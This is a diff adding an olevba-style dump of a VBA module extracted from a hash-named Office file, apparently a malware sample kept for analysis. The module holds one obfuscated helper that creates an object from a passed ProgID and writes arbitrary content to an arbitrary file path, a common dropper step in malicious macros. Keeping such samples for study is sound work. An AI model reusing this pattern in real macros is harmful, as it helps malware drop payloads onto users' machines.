@@ -1,0 +1,14 @@
+Filename     : ./macros/5f2a6601d349af00a4cc101a638003af2f330879c333168cbf6a7a123dfb3928
+OLE stream   : Macros/VBA/Module1
+VBA filename : Module1.bas
+----------------------------------------
+Attribute VB_Name = "Module1"
+Public Function ypzs(pOyT As String, AtUF As String, XoUs As String)
+    Dim yQle As Object
+    Set yQle = CreateObject(XoUs)
+    Dim nsSh As Object
+
+    Set nsSh = yQle.CreateTextFile(pOyT, True, True)
+    nsSh.Write AtUF
+    nsSh.Close
+End Function
